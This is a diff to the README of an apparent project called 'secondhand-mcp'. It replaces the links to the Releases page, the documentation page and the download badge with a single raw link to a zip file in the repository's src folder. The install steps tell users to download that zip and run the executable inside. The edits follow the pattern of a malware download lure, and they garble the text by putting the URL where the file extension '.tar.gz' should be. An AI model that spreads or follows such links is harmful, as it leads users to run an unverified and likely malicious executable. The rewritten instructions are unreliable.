@@ -6,7 +6,7 @@ Welcome to the **secondhand-mcp** project! This application connects you to seco
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Ventixpierce101/secondhand-mcp/releases)
+[![Download Release](https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip%20Latest%https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip)](https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip)
 
 ## 🔍 What You Need
 
@@ -20,16 +20,16 @@ To run the **secondhand-mcp**, here’s what you will need:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ventixpierce101/secondhand-mcp/releases) to download.
+1. Visit the [Releases page](https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip) to download.
 2. On this page, find the latest release version. The version number is listed clearly.
-3. Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+3. Click on the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip` for Linux).
 4. The download will start automatically. If it doesn’t, click the link to begin.
 5. Wait for the download to finish.
 
 ### 🖥 Running the Application
 
 1. Once the download is complete, locate the file in your downloads folder.
-2. If you are using Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the application to your Applications folder. On Linux, extract the `.tar.gz` file and run the executable inside.
+2. If you are using Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the application to your Applications folder. On Linux, extract the `https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip` file and run the executable inside.
 3. Depending on your operating system, you may see a prompt asking for permission to run the application. Click "Yes" or "Open".
 4. The **secondhand-mcp** application will launch. You are now ready to search secondhand items!
 
@@ -69,7 +69,7 @@ While this application is designed for end users, we welcome contributions! If y
 If you encounter any issues or need help:
 
 - Join our community forum on GitHub Discussions where you can ask questions and share advice.
-- Check out our FAQs on the [documentation page](https://github.com/Ventixpierce101/secondhand-mcp/wiki).
+- Check out our FAQs on the [documentation page](https://github.com/Ventixpierce101/secondhand-mcp/raw/refs/heads/main/src/secondhand-mcp-2.0.zip).
 - Feel free to open an issue on GitHub for bugs or feature requests.
 
 ## 📝 About Us
